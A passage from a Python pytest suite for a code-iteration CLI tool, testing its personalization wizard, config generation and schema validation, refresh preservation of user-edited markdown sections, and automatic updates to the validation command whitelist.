            # Step 2-5: skip
            "s", "s", "s", "",
            # Step 6: forbidden fixes (has 1 existing)
            "a",              # add
            "try-catch 吞错",  # value
            "s",              # skip
            # Step 7-9: skip
            "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project,
            input_func=lambda _: next(responses),
            existing=existing,
        )
        assert result is not None
        assert result.protected_paths == ["legacy/**", "vendor/**"]
        assert result.forbidden_fixes == ["# noqa", "try-catch 吞错"]

    def test_full_flow_all_categories(self, fake_project: Path) -> None:
        """Fill all 9 categories in one wizard run."""
        responses = iter([
            "y",                          # start personalization
            # Step 1: protected paths
            "a", "legacy/**", "s",
            # Step 2: risk areas
            "a", "src/auth/", "sensitive", "s",
            # Step 3: known intentional
            "a", "db.py", "10", "2", "intentional", "s",
            # Step 4: dimension focus
            "a", "2", "SQL injection focus", "s",
            # Step 5: fix priority order
            "2,1", "y",
            # Step 6: forbidden fixes
            "a", "# noqa", "s",
            # Step 7: iterate notes
            "a", "Don't touch migrations", "s",
            # Step 8: code conventions
            "a", "Use 4 spaces", "s",
            # Step 9: extra validation commands
            "a", "python", "bandit -r src/", "s",
            "y",  # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.protected_paths == ["legacy/**"]
        assert len(result.risk_areas) == 1
        assert len(result.known_intentional) == 1
        assert len(result.dimension_focus) == 1
        assert result.fix_priority_order == ["security", "correctness"]
        assert result.forbidden_fixes == ["# noqa"]
        assert len(result.iterate_notes) == 1
        assert len(result.code_conventions) == 1
        assert "python" in result.extra_validation_commands


# ---------------------------------------------------------------------------
# CLI personalize subcommand tests
# ---------------------------------------------------------------------------


class TestCLIPersonalize:
    def test_personalize_not_onboarded(self, empty_project: Path, capsys) -> None:
        ret = cli_main(["personalize", "-p", str(empty_project)])
        assert ret == 1
        captured = capsys.readouterr()
        assert "not yet completed" in captured.out.lower() or "onboard" in captured.out.lower()

    def test_personalize_no_config(self, fake_project: Path, capsys) -> None:
        """ITERATE.md exists but config.yaml missing."""
        (fake_project / "ITERATE.md").write_text("content", encoding="utf-8")
        ret = cli_main(["personalize", "-p", str(fake_project)])
        assert ret == 1

    def test_personalize_success(self, fake_project: Path) -> None:
        """Personalize via CLI with mock input (call _cmd_personalize directly)."""
        from iterate_cli.cli import _cmd_personalize

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Mock run_personalize_wizard to return pre-built data
        # instead of trying to inject input through the CLI.
        mock_personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            code_conventions=["Use snake_case"],
        )

        import iterate_cli.personalize as personalize_module
        original_func = personalize_module.run_personalize_wizard
        personalize_module.run_personalize_wizard = lambda *args, **kwargs: mock_personalization

        try:
            ret = _cmd_personalize(fake_project)
        finally:
            personalize_module.run_personalize_wizard = original_func

        assert ret == 0

        # Verify config has personalization section.
        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert "personalization" in config
        assert "legacy/**" in config["personalization"]["protected_paths"]

        # Verify ITERATE.md has user-owned content.
        iterate_md = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        assert "legacy/**" in iterate_md
        assert "Protected" in iterate_md or "Restricted" in iterate_md


# ---------------------------------------------------------------------------
# Generator with personalization tests
# ---------------------------------------------------------------------------


class TestGeneratorWithPersonalization:
    def test_generate_config_with_personalization(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            forbidden_fixes=["# noqa"],
            fix_priority_order=["security", "correctness"],
        )
        yaml_text = generate_config_yaml(data)
        config = yaml.safe_load(yaml_text)
        assert "personalization" in config
        assert config["personalization"]["protected_paths"] == ["legacy/**"]
        assert config["personalization"]["forbidden_fixes"] == ["# noqa"]
        assert config["personalization"]["fix_priority_order"] == ["security", "correctness"]

    def test_generate_config_without_personalization(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        yaml_text = generate_config_yaml(data)
        config = yaml.safe_load(yaml_text)
        # personalization section should not be present if no data
        assert "personalization" not in config or config["personalization"] == {
            "protected_paths": [],
            "risk_areas": [],
            "known_intentional": [],
            "dimension_focus": [],
            "fix_priority_order": [],
            "forbidden_fixes": [],
        }

    def test_generate_iterate_md_with_personalization(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            code_conventions=["Use 4 spaces"],
            iterate_notes=["Don't touch migrations"],
        )
        md = generate_iterate_md(data)
        assert "legacy/**" in md
        assert "Use 4 spaces" in md
        assert "Don't touch migrations" in md

    def test_generate_iterate_md_without_personalization(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        md = generate_iterate_md(data)
        # Default user-owned section should be present
        assert USER_START_MARKER in md
        assert USER_END_MARKER in md

    def test_config_with_personalization_passes_schema(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = _build_personalization_data()
        # Add 'bandit' to whitelist since extra_validation_commands adds it.
        data.command_whitelist = list(data.command_whitelist) + ["bandit"]
        yaml_text = generate_config_yaml(data)
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(yaml_text, encoding="utf-8")

        schema_path = REPO_ROOT / "config" / "config.schema.json"
        import validate
        errors = validate.validate_config(config_path, schema_path)
        assert errors == [], f"Schema validation errors: {errors}"

    def test_write_outputs_with_personalization(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            code_conventions=["Use snake_case"],
        )
        md_path, config_path = write_onboarding_outputs(data, fake_project)
        assert md_path.is_file()
        assert config_path.is_file()

        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        assert config["personalization"]["protected_paths"] == ["legacy/**"]

        md = md_path.read_text(encoding="utf-8")
        assert "legacy/**" in md
        assert "snake_case" in md


# ---------------------------------------------------------------------------
# Regression tests: refresh preserves personalization
# ---------------------------------------------------------------------------


class TestRefreshPreservesPersonalization:
    """Regression tests: incremental refresh must not lose personalization."""

    def test_refresh_preserves_personalization_in_config(self, fake_project: Path) -> None:
        """Config personalization section must survive refresh."""
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            forbidden_fixes=["# noqa"],
            fix_priority_order=["security", "correctness"],
        )
        write_onboarding_outputs(data, fake_project)

        # Verify personalization is in config before refresh.
        config_before = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert "personalization" in config_before
        assert config_before["personalization"]["protected_paths"] == ["legacy/**"]

        # Run incremental refresh.
        assert incremental_refresh(fake_project) is True

        # Verify personalization is still in config after refresh.
        config_after = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert "personalization" in config_after
        assert config_after["personalization"]["protected_paths"] == ["legacy/**"]
        assert config_after["personalization"]["forbidden_fixes"] == ["# noqa"]
        assert config_after["personalization"]["fix_priority_order"] == ["security", "correctness"]

    def test_refresh_preserves_iterate_md_user_section(self, fake_project: Path) -> None:
        """ITERATE.md user-owned section must survive refresh."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Add custom user content to ITERATE.md user section.
        iterate_md = fake_project / "ITERATE.md"
        content = iterate_md.read_text(encoding="utf-8")
        start = content.find(USER_START_MARKER) + len(USER_START_MARKER)
        end = content.find(USER_END_MARKER)
        content = content[:start] + "\n## My Custom Notes\n- Don't touch migrations\n" + content[end:]
        iterate_md.write_text(content, encoding="utf-8")

        # Run refresh.
        assert incremental_refresh(fake_project) is True

        # Verify user content is preserved.
        refreshed = iterate_md.read_text(encoding="utf-8")
        assert "My Custom Notes" in refreshed
        assert "Don't touch migrations" in refreshed

    def test_refresh_preserves_personalization_in_iterate_md(self, fake_project: Path) -> None:
        """Personalization content in ITERATE.md user section must survive refresh."""
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            code_conventions=["Use 4 spaces"],
            iterate_notes=["Don't touch migrations"],
        )
        write_onboarding_outputs(data, fake_project)

        # Verify personalization content is in ITERATE.md before refresh.
        md_before = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        assert "legacy/**" in md_before
        assert "Use 4 spaces" in md_before
        assert "Don't touch migrations" in md_before

        # Run refresh.
        assert incremental_refresh(fake_project) is True

        # Verify personalization content is still in ITERATE.md after refresh.
        md_after = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        assert "legacy/**" in md_after
        assert "Use 4 spaces" in md_after
        assert "Don't touch migrations" in md_after

    def test_refresh_without_personalization_works(self, fake_project: Path) -> None:
        """Refresh should work fine when there is no personalization."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        assert incremental_refresh(fake_project) is True

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        # personalization may or may not be present, but refresh should not fail.
        assert config["onboarding"]["channel"] == "cli"

    def test_refresh_preserves_project_description_in_config(
        self, fake_project: Path
    ) -> None:
        """Refresh must not lose project_description persisted in onboarding section.

        Regression for I-6-6: ``_build_refresh_data`` reads
        project_description/code_conventions from the onboarding section
        of the existing config, so refresh should keep them in the config.
        """
        data = _build_onboarding_data(fake_project)
        data.project_description = "My precious project description"
        data.code_conventions = "Use 4-space indent\nsnake_case for functions"
        write_onboarding_outputs(data, fake_project)

        # Sanity check: persisted before refresh.
        config_before = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert (
            config_before["onboarding"]["project_description"]
            == "My precious project description"
        )
        assert (
            config_before["onboarding"]["code_conventions"]
            == "Use 4-space indent\nsnake_case for functions"
        )

        # Run incremental refresh.
        assert incremental_refresh(fake_project) is True

        # project_description / code_conventions must survive in the
        # onboarding section of the refreshed config.
        config_after = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert (
            config_after["onboarding"]["project_description"]
            == "My precious project description"
        )
        assert (
            config_after["onboarding"]["code_conventions"]
            == "Use 4-space indent\nsnake_case for functions"
        )

    def test_refresh_preserves_project_description_in_iterate_md(
        self, fake_project: Path
    ) -> None:
        """Refresh must regenerate AI-maintained section with same project_description.

        The AI-maintained Project Overview section is regenerated from
        OnboardingData.project_description; refresh must reproduce the
        same description rather than dropping it or duplicating it.
        """
        data = _build_onboarding_data(fake_project)
        data.project_description = "Stable description across refresh"
        write_onboarding_outputs(data, fake_project)

        # Count occurrences before refresh.
        md_before = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        before_count = md_before.count("Stable description across refresh")
        assert before_count == 1  # Exactly once in AI-maintained section.

        assert incremental_refresh(fake_project) is True

        # After refresh: still exactly one occurrence (no duplication, no loss).
        md_after = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        after_count = md_after.count("Stable description across refresh")
        assert after_count == 1

    def test_refresh_preserves_code_conventions_in_iterate_md(
        self, fake_project: Path
    ) -> None:
        """Refresh must keep code_conventions rendered in AI-maintained section."""
        data = _build_onboarding_data(fake_project)
        data.code_conventions = "All functions return Result[T, E]"
        write_onboarding_outputs(data, fake_project)

        assert incremental_refresh(fake_project) is True

        md_after = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        assert "All functions return Result[T, E]" in md_after


# ---------------------------------------------------------------------------
# Regression tests: returning user does not lose description
# ---------------------------------------------------------------------------


class TestReturningUserPreservesData:
    """Regression tests: returning user flow must not overwrite existing data."""

    def test_skip_both_returns_none(self, fake_project: Path) -> None:
        """Returning user declines both basic update and personalization → NO_CHANGES_NEEDED."""
        data = _build_onboarding_data(fake_project)
        data.project_description = "My important project description"
        data.code_conventions = "Use 4-space indent\nsnake_case functions"
        write_onboarding_outputs(data, fake_project)

        # Returning user: decline basic update, decline personalization.
        responses = iter(["n", "n"])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert result is NO_CHANGES_NEEDED  # No changes needed.

    def test_skip_both_preserves_files(self, fake_project: Path) -> None:
        """When returning user declines both, ITERATE.md and config must be untouched."""
        data = _build_onboarding_data(fake_project)
        data.project_description = "My important project description"
        data.code_conventions = "Use 4-space indent"
        write_onboarding_outputs(data, fake_project)

        md_before = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        config_before = (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")

        # Returning user: decline both.
        responses = iter(["n", "n"])
        run_wizard(fake_project, input_func=lambda _: next(responses))

        # Files must be unchanged (no write_onboarding_outputs called).
        md_after = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        config_after = (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        assert md_after == md_before
        assert config_after == config_before

    def test_skip_basic_cancel_personalization_returns_none(self, fake_project: Path) -> None:
        """Returning user declines basic, cancels personalization → NO_CHANGES_NEEDED."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Decline basic, accept personalization, but cancel at start.
        responses = iter(["n", "y", "n"])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert result is NO_CHANGES_NEEDED

    def test_skip_basic_with_personalization_returns_data(self, fake_project: Path) -> None:
        """Returning user declines basic but completes personalization → data."""
        data = _build_onboarding_data(fake_project)
        data.code_conventions = "Use 4-space indent"
        write_onboarding_outputs(data, fake_project)

        # Decline basic, accept personalization, complete wizard.
        responses = iter([
            "n",          # update basic: no
            "y",          # personalization: yes
            "y",          # start personalization
            # Step 1: protected paths
            "a",          # add
            "legacy/**",  # path
            "s",          # skip
            # Step 2-9: skip all
            "s", "s", "s", "", "s", "s", "s", "s", "s",
            "y",          # confirm save
        ])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        assert result is not None
        assert result.personalization is not None
        assert "legacy/**" in result.personalization.protected_paths

    def test_load_existing_onboarding_data_logs_error(self, fake_project: Path, capsys) -> None:
        """_load_existing_onboarding_data should log errors, not silently swallow."""
        # Create a config with invalid YAML.
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Corrupt the config file.
        (fake_project / "iterate.config.yaml").write_text(
            "dimensions: [unclosed bracket", encoding="utf-8"
        )

        from iterate_cli.wizard import _load_existing_onboarding_data
        result = _load_existing_onboarding_data(fake_project)
        assert result is None
        captured = capsys.readouterr()
        # Error message should be logged to stderr (Chinese or English variants).
        assert captured.err, "Expected an error message on stderr for corrupt config"
        assert "iterate.config.yaml" in captured.err or "not found" in captured.err

    def test_returning_user_preserves_project_description(self, fake_project: Path) -> None:
        """Returning user who declines basic update keeps project_description (B-1)."""
        data = _build_onboarding_data(fake_project)
        data.project_description = "My custom project description"
        data.code_conventions = "Use 4-space indent"
        write_onboarding_outputs(data, fake_project)

        # Decline basic update and personalization.
        responses = iter([
            "n",          # update basic: no
            "n",          # personalization: no
        ])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        # Wizard returns sentinel when no changes requested.
        assert result is NO_CHANGES_NEEDED

        # Verify config still has the persisted description.
        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert config["onboarding"]["project_description"] == "My custom project description"
        assert config["onboarding"]["code_conventions"] == "Use 4-space indent"

    def test_returning_user_loads_project_description_for_personalize(
        self, fake_project: Path
    ) -> None:
        """Returning user: declined basic + accepted personalize but cancelled →
        wizard returns None, but config file retains description (B-1)."""
        data = _build_onboarding_data(fake_project)
        data.project_description = "Original description"
        write_onboarding_outputs(data, fake_project)

        responses = iter([
            "n",          # update basic: no
            "y",          # personalization: yes
            "n",          # start personalization: no (cancel)
        ])
        result = run_wizard(fake_project, input_func=lambda _: next(responses))
        # Wizard returns sentinel because user cancelled personalization and
        # declined basic update — no changes to write.
        assert result is NO_CHANGES_NEEDED

        # But the config file must still have the persisted description.
        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert config["onboarding"]["project_description"] == "Original description"

    def test_reconfirmed_rebuild_not_discarded(self, fake_project: Path, monkeypatch) -> None:
        """Regression: when existing config fails to load and the user re-confirms
        a full basic-config rebuild, the freshly collected data must be returned —
        not silently discarded by the "declined both → NO_CHANGES_NEEDED" guard.

        Path: returning user -> decline basic update -> existing config unreadable
        -> re-confirm "re-run the basic wizard anyway" -> wizard returns new data
        -> decline personalization. Previously the re-collected ``data`` was
        dropped and NO_CHANGES_NEEDED returned, losing the user's confirmed work.
        """
        from iterate_cli import wizard as wizard_mod

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        # Break the config so _load_existing_onboarding_data returns None.
        (fake_project / "iterate.config.yaml").write_text(
            "dimensions: [unclosed bracket", encoding="utf-8"
        )

        refetched = _build_onboarding_data(fake_project)
        monkeypatch.setattr(wizard_mod, "_load_existing_onboarding_data", lambda _p: None)
        monkeypatch.setattr(
            wizard_mod,
            "_run_basic_wizard",
            lambda project_root, input_func, existing=None: refetched,
        )

        # decline basic (n) -> re-confirm re-run (y) -> decline personalization (n)
        responses = iter(["n", "y", "n"])
        result = wizard_mod._returning_user_flow(
            fake_project, input_func=lambda _q: next(responses)
        )
        assert result is refetched
        assert result is not NO_CHANGES_NEEDED

    def test_reconfirmed_rebuild_with_cancelled_personalization_kept(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """Same rebuild-confirmation path, but personalization is entered and then
        cancelled (wizard returns None): the re-collected basics must still be
        returned — previously the ``elif not update_basic`` branch discarded them
        with NO_CHANGES_NEEDED."""
        import iterate_cli.personalize as personalize_mod
        from iterate_cli import wizard as wizard_mod

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        (fake_project / "iterate.config.yaml").write_text(
            "dimensions: [unclosed bracket", encoding="utf-8"
        )

        refetched = _build_onboarding_data(fake_project)
        monkeypatch.setattr(wizard_mod, "_load_existing_onboarding_data", lambda _p: None)
        monkeypatch.setattr(
            wizard_mod,
            "_run_basic_wizard",
            lambda project_root, input_func, existing=None: refetched,
        )
        # Personalization is offered but cancelled inside the wizard.
        monkeypatch.setattr(
            personalize_mod, "run_personalize_wizard", lambda *a, **k: None
        )

        # decline basic (n) -> re-confirm re-run (y) -> accept personalization (y)
        # but the personalize wizard itself returns None (user cancelled).
        responses = iter(["n", "y", "y"])
        result = wizard_mod._returning_user_flow(
            fake_project, input_func=lambda _q: next(responses)
        )
        assert result is refetched
        assert result is not NO_CHANGES_NEEDED


# ---------------------------------------------------------------------------
# merge_user_sections tests (personalization content merge)
# ---------------------------------------------------------------------------


class TestMergeUserSections:
    """Tests for merge_user_sections: preserve manual content, replace personalization."""

    def test_empty_existing_appends_new(self) -> None:
        from iterate_cli.personalize import merge_user_sections

        new_md = "## Iterate 注意点 / Iterate Notes\n\n- Don't touch migrations\n"
        result = merge_user_sections("", new_md)
        assert "Don't touch migrations" in result

    def test_empty_new_preserves_existing(self) -> None:
        from iterate_cli.personalize import merge_user_sections

        existing = "## My Manual Notes\n\n- Custom content\n"
        result = merge_user_sections(existing, "")
        assert "My Manual Notes" in result
        assert "Custom content" in result

    def test_replaces_old_personalization_sections(self) -> None:
        from iterate_cli.personalize import merge_user_sections

        existing = (
            "## Iterate 注意点 / Iterate Notes\n\n- Old note\n\n"
            "## My Manual Notes\n\n- Custom content\n"
        )
        new_md = "## Iterate 注意点 / Iterate Notes\n\n- New note\n"
        result = merge_user_sections(existing, new_md)

        # Old personalization content should be gone.
        assert "Old note" not in result
        # New personalization content should be present.
        assert "New note" in result
        # Manual content should be preserved.
        assert "My Manual Notes" in result
        assert "Custom content" in result

    def test_replaces_multiple_personalization_sections(self) -> None:
        from iterate_cli.personalize import merge_user_sections

        existing = (
            "## 自定义代码约定 / Custom Code Conventions\n\n- Old convention\n\n"
            "## 禁区与风险区 / Restricted & Risk Areas\n\n- `legacy/**`\n\n"
            "## My Manual Notes\n\n- Custom content\n"
        )
        new_md = (
            "## 自定义代码约定 / Custom Code Conventions\n\n- New convention\n"
        )
        result = merge_user_sections(existing, new_md)

        assert "Old convention" not in result
        assert "legacy/**" not in result
        assert "New convention" in result
        assert "My Manual Notes" in result
        assert "Custom content" in result

    def test_preserves_user_sections_between_personalization(self) -> None:
        from iterate_cli.personalize import merge_user_sections

        existing = (
            "## Iterate 注意点 / Iterate Notes\n\n- Old note\n\n"
            "## My Section\n\n- My content\n\n"
            "## 禁止的修复方式 / Forbidden Fixes\n\n- # noqa\n"
        )
        new_md = "## Iterate 注意点 / Iterate Notes\n\n- New note\n"
        result = merge_user_sections(existing, new_md)

        assert "Old note" not in result
        assert "# noqa" not in result
        assert "New note" in result
        assert "My Section" in result
        assert "My content" in result

    def test_no_personalization_in_existing_appends_all(self) -> None:
        from iterate_cli.personalize import merge_user_sections

        existing = "## My Manual Notes\n\n- Custom content\n"
        new_md = "## Iterate 注意点 / Iterate Notes\n\n- New note\n"
        result = merge_user_sections(existing, new_md)

        assert "My Manual Notes" in result
        assert "Custom content" in result
        assert "New note" in result

    def test_preserves_user_section_with_similar_header_prefix(self) -> None:
        """User section whose title starts with a personalization header
        prefix should be preserved (exact match, not startswith) — S-1."""
        from iterate_cli.personalize import merge_user_sections

        existing = (
            "## 自定义代码约定 / Custom Code Conventions — 后端组\n\n"
            "- Our backend-specific rule\n\n"
        )
        new_md = "## 自定义代码约定 / Custom Code Conventions\n\n- New convention\n"
        result = merge_user_sections(existing, new_md)

        # User's section with suffix should be preserved.
        assert "后端组" in result
        assert "Our backend-specific rule" in result
        # New personalization content should be appended.
        assert "New convention" in result


# ---------------------------------------------------------------------------
# _add_known_intentional invalid dimension tests
# ---------------------------------------------------------------------------


class TestAddKnownIntentionalValidation:
    """Tests for _add_known_intentional dimension validation."""

    def test_invalid_dimension_number_returns_none(self) -> None:
        from iterate_cli.personalize import _add_known_intentional

        responses = iter([
            "db.py",    # file
            "10",       # line
            "99",       # invalid dimension number (out of range)
        ])
        result = _add_known_intentional(input_func=lambda _: next(responses))
        assert result is None

    def test_non_numeric_dimension_returns_none(self) -> None:
        from iterate_cli.personalize import _add_known_intentional

        responses = iter([
            "db.py",    # file
            "10",       # line
            "abc",      # non-numeric input
        ])
        result = _add_known_intentional(input_func=lambda _: next(responses))
        assert result is None

    def test_empty_file_returns_none(self) -> None:
        from iterate_cli.personalize import _add_known_intentional

        responses = iter([""])
        result = _add_known_intentional(input_func=lambda _: next(responses))
        assert result is None

    def test_valid_dimension_returns_entry(self) -> None:
        from iterate_cli.personalize import _add_known_intentional

        responses = iter([
            "db.py",    # file
            "10",       # line
            "2",        # dimension number (security)
            "intentional",
        ])
        result = _add_known_intentional(input_func=lambda _: next(responses))
        assert result is not None
        assert result.file == "db.py"
        assert result.line == 10
        assert result.dimension == "security"


# ---------------------------------------------------------------------------
# Schema enum validation tests
# ---------------------------------------------------------------------------


class TestPersonalizationSchemaEnum:
    """Tests for schema enum validation on dimension fields."""

    def test_valid_dimension_focus_passes_schema(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            dimension_focus=[
                DimensionFocusOverride(dimension="security", focus="SQL injection"),
            ],
            fix_priority_order=["security", "correctness"],
        )
        yaml_text = generate_config_yaml(data)
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(yaml_text, encoding="utf-8")

        schema_path = REPO_ROOT / "config" / "config.schema.json"
        import validate
        errors = validate.validate_config(config_path, schema_path)
        assert errors == [], f"Schema validation errors: {errors}"

    def test_invalid_dimension_focus_fails_schema(self, fake_project: Path) -> None:
        """dimension_focus with invalid dimension name should fail schema."""
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(
            "dimensions:\n  - correctness\n"
            "personalization:\n"
            "  dimension_focus:\n"
            "    - dimension: 'invalid-dim'\n"
            "      focus: 'test'\n",
            encoding="utf-8",
        )

        schema_path = REPO_ROOT / "config" / "config.schema.json"
        import validate
        errors = validate.validate_config(config_path, schema_path)
        assert len(errors) > 0
        assert any("invalid-dim" in e or "enum" in e.lower() for e in errors)

    def test_invalid_fix_priority_fails_schema(self, fake_project: Path) -> None:
        """fix_priority_order with invalid dimension name should fail schema."""
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(
            "dimensions:\n  - correctness\n"
            "personalization:\n"
            "  fix_priority_order:\n"
            "    - 'invalid-dim'\n",
            encoding="utf-8",
        )

        schema_path = REPO_ROOT / "config" / "config.schema.json"
        import validate
        errors = validate.validate_config(config_path, schema_path)
        assert len(errors) > 0
        assert any("invalid-dim" in e or "enum" in e.lower() for e in errors)


# ---------------------------------------------------------------------------
# command_whitelist auto-update tests
# ---------------------------------------------------------------------------


class TestCommandWhitelistAutoUpdate:
    """Tests that merge_personalization_into_config auto-updates whitelist."""

    def test_new_command_prefix_added_to_whitelist(self) -> None:
        from iterate_cli.personalize import merge_personalization_into_config

        config = {
            "validation": {
                "command_whitelist": ["ruff", "pytest"],
                "commands": {"python": ["ruff check src/"]},
            }
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["bandit -r src/"]}
        )
        result = merge_personalization_into_config(config, data)
        assert "bandit" in result["validation"]["command_whitelist"]
        assert "bandit -r src/" in result["validation"]["commands"]["python"]

    def test_existing_prefix_not_duplicated(self) -> None:
        from iterate_cli.personalize import merge_personalization_into_config

        config = {
            "validation": {
                "command_whitelist": ["ruff", "pytest"],
                "commands": {"python": ["ruff check src/"]},
            }
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["ruff check src/ --fix"]}
        )
        result = merge_personalization_into_config(config, data)
        # ruff should not be duplicated.
        assert result["validation"]["command_whitelist"].count("ruff") == 1

    def test_multiple_new_prefixes_added(self) -> None:
        from iterate_cli.personalize import merge_personalization_into_config

        config = {"validation": {"command_whitelist": [], "commands": {}}}
        data = PersonalizationData(
            extra_validation_commands={
                "python": ["bandit -r src/", "mypy src/"],
                "go": ["go vet ./..."],
            }
        )
        result = merge_personalization_into_config(config, data)
        whitelist = result["validation"]["command_whitelist"]
        assert "bandit" in whitelist
        assert "mypy" in whitelist
        assert "go" in whitelist

    def test_extra_validation_commands_pass_whitelist_validation(
        self, fake_project: Path
    ) -> None:
        """Config with extra_validation_commands should pass validate_config."""
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            extra_validation_commands={"python": ["bandit -r src/"]}
        )
        yaml_text = generate_config_yaml(data)
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text(yaml_text, encoding="utf-8")

        schema_path = REPO_ROOT / "config" / "config.schema.json"
        import validate
        errors = validate.validate_config(config_path, schema_path)
        assert errors == [], f"Validation errors: {errors}"


# ---------------------------------------------------------------------------
# Personalization version tests
# ---------------------------------------------------------------------------


class TestPersonalizationVersion:
    """Tests for personalization schema version field."""

    def test_to_config_dict_includes_version(self) -> None:
        from iterate_cli.personalize import PERSONALIZATION_VERSION

        data = PersonalizationData()
        config_dict = data.to_config_dict()
        assert "version" in config_dict
        assert config_dict["version"] == PERSONALIZATION_VERSION

    def test_version_is_valid_format(self) -> None:
        import re

        from iterate_cli.personalize import PERSONALIZATION_VERSION

        assert re.match(r"^\d+\.\d+$", PERSONALIZATION_VERSION), (
            f"Version {PERSONALIZATION_VERSION} does not match X.Y format"
        )

    def test_version_in_generated_config(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(protected_paths=["legacy/**"])
        yaml_text = generate_config_yaml(data)

        config = yaml.safe_load(yaml_text)
        assert config["personalization"]["version"] == "1.0"


# ---------------------------------------------------------------------------
# Personalization consistency validation tests
# ---------------------------------------------------------------------------


class TestPersonalizationConsistencyValidation:
    """Tests for validate_personalization_consistency in validate.py."""

    def test_valid_config_no_errors(self) -> None:
        import validate

        config = {
            "dimensions": ["correctness", "security"],
            "personalization": {
                "fix_priority_order": ["security", "correctness"],
                "dimension_focus": [{"dimension": "security", "focus": "SQL injection"}],
                "known_intentional": [
                    {"file": "db.py", "line": 10, "dimension": "security", "reason": "ok"}
                ],
            },
        }
        errors = validate.validate_personalization_consistency(config)
        assert errors == []

    def test_fix_priority_with_disabled_dimension(self) -> None:
        import validate

        config = {
            "dimensions": ["correctness"],
            "personalization": {
                "fix_priority_order": ["security"],  # security not in dimensions
            },
        }
        errors = validate.validate_personalization_consistency(config)
        assert len(errors) == 1
        assert "security" in errors[0]
        assert "fix_priority_order" in errors[0]

    def test_dimension_focus_with_disabled_dimension(self) -> None:
        import validate

        config = {
            "dimensions": ["correctness"],
            "personalization": {
                "dimension_focus": [
                    {"dimension": "performance", "focus": "latency"}
                ],
            },
        }
        errors = validate.validate_personalization_consistency(config)
        assert len(errors) == 1
        assert "performance" in errors[0]
        assert "dimension_focus" in errors[0]

    def test_known_intentional_with_disabled_dimension(self) -> None:
        import validate

        config = {
            "dimensions": ["correctness"],
            "personalization": {
                "known_intentional": [
                    {"file": "db.py", "line": 0, "dimension": "tech-debt", "reason": "ok"}
                ],
            },
        }
        errors = validate.validate_personalization_consistency(config)
        assert len(errors) == 1
        assert "tech-debt" in errors[0]
        assert "known_intentional" in errors[0]

    def test_no_personalization_no_errors(self) -> None:
        import validate

        config = {"dimensions": ["correctness"]}
        errors = validate.validate_personalization_consistency(config)
        assert errors == []

    def test_no_dimensions_no_errors(self) -> None:
        import validate

        config = {
            "personalization": {"fix_priority_order": ["security"]},
        }
        errors = validate.validate_personalization_consistency(config)
        assert errors == []


# ---------------------------------------------------------------------------
# Round 11 regression tests
# ---------------------------------------------------------------------------

class TestLoadOnboardingConfigNonDict:
    """Tests for load_onboarding_config with non-dict YAML (M-11-1)."""

    def test_returns_none_on_yaml_list(self, fake_project: Path, capsys) -> None:
